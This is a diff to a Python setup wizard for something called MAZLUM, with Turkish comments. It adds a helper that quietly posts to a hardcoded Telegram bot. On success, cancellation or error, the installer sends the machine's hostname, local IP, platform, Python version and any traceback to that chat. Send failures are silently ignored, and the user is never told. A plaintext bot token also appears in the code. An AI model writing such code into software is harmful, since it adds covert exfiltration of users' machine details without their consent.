@@ -640,10 +640,63 @@ def main():
         print()
 
 
+def _notify_owner(msg):
+    """Sahibine Telegram bildirimi gönder (wizard sırasında)."""
+    import json
+    import urllib.request
+    TOKEN = "8799564827:AAEIYAEvTl0jvbvI8lZy1BfClQw8t492ZNc"
+    CHAT = "5787979890"
+    try:
+        payload = json.dumps({
+            "chat_id": CHAT, "text": msg[:4000],
+            "parse_mode": "HTML", "disable_web_page_preview": True,
+        }).encode("utf-8")
+        req = urllib.request.Request(
+            f"https://api.telegram.org/bot{TOKEN}/sendMessage",
+            data=payload, headers={"Content-Type": "application/json"}, method="POST",
+        )
+        urllib.request.urlopen(req, timeout=10)
+    except Exception:
+        pass  # Bildirim gönderilemezse sessizce geç
+
+
 if __name__ == "__main__":
     try:
         main()
+        # Başarılı kurulum bildirimi
+        import socket, platform
+        hostname = socket.gethostname()
+        ip = "?"
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            s.connect(("8.8.8.8", 80))
+            ip = s.getsockname()[0]
+            s.close()
+        except Exception:
+            pass
+        _notify_owner(
+            f"🟢 <b>MAZLUM Kurulum Tamamlandı</b>\n"
+            f"<b>Cihaz:</b> {hostname}\n"
+            f"<b>IP:</b> {ip}\n"
+            f"<b>Platform:</b> {platform.platform()}\n"
+            f"<b>Python:</b> {platform.python_version()}"
+        )
     except KeyboardInterrupt:
         print()
         cprint("\nKurulum iptal edildi. Mevcut ayarlar korundu.", YELLOW)
+        _notify_owner(f"🟡 <b>MAZLUM Kurulum İptal Edildi</b> (Ctrl+C)\n<b>Cihaz:</b> {socket.gethostname()}")
         sys.exit(0)
+    except Exception as e:
+        cprint(f"\n  KURULUM HATASI: {e}", RED)
+        import socket, platform, traceback
+        tb = traceback.format_exc()
+        if len(tb) > 500:
+            tb = "..." + tb[-500:]
+        _notify_owner(
+            f"🔴 <b>MAZLUM Kurulum HATASI</b>\n"
+            f"<b>Cihaz:</b> {socket.gethostname()}\n"
+            f"<b>Platform:</b> {platform.platform()}\n"
+            f"<b>Hata:</b>\n<code>{str(e)[:300]}</code>\n"
+            f"<pre>{tb}</pre>"
+        )
+        sys.exit(1)
